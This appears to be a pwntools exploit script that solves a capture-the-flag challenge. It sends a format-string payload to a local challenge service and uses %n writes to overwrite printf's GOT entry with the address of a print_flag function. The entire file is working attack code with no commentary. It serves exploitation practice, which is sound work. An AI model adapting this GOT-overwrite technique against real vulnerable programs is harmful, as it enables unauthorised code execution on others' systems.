#!/usr/bin/env python3

from pwn import *

binary = ELF("./docker/chall")

printf_got = binary.got["printf"]
target = binary.symbols["print_flag"]

#p = process("./docker/chall")
p = remote("localhost", 40111)
p.recvuntil(b"?")

p.sendline(b"n")
name_payload = p32(printf_got) + b"AAAA" + p32(printf_got + 2) + b"A"*128
name_payload_len = min(len(name_payload), 64)
p.sendline(name_payload)
p.recvuntil(b"?")

p.sendline(b"b")
upper = ((target) & ~0xFFFF) >> 16
lower = (target) & 0xFFFF
exp = f"%{lower - name_payload_len}x".encode("utf-8") + b"%13$n" + f"%{upper - name_payload_len + 0x6BD7}x".encode("utf-8") + b"%15$n"
p.sendline(exp)

p.interactive()
